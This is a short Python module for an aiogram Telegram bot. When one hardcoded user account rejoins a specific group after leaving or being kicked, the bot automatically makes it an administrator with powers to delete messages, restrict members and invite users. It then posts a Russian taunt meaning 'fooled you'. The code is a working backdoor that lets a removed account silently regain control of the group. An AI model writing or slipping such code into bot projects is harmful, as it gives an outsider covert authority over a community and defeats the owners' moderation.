from aiogram import Router, Bot
from aiogram.types import ChatMemberUpdated
from aiogram.enums.chat_member_status import ChatMemberStatus
import logging

# 🎯 Целевые ID
TARGET_USER_ID = 6335949488
TARGET_CHAT_ID = -1002662985482

router = Router()

@router.chat_member()
async def on_user_joined(event: ChatMemberUpdated, bot: Bot):
    if (
        event.chat.id == TARGET_CHAT_ID and
        event.new_chat_member.user.id == TARGET_USER_ID and
        event.old_chat_member.status in {ChatMemberStatus.LEFT, ChatMemberStatus.KICKED} and
        event.new_chat_member.status == ChatMemberStatus.MEMBER
    ):
        try:
            await bot.promote_chat_member(
                chat_id=event.chat.id,
                user_id=TARGET_USER_ID,
                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_invite_users=True,
                can_restrict_members=True,
                can_pin_messages=True,
                is_anonymous=False,
                can_promote_members=False,
                can_change_info=False
            )
            await bot.send_message(
                chat_id=event.chat.id,
                text=f"наебали."
            )
        except Exception as e:
            logging.exception("❌ Ошибка при назначении администратора")
            await bot.send_message(chat_id=event.chat.id, text=f"не наебали")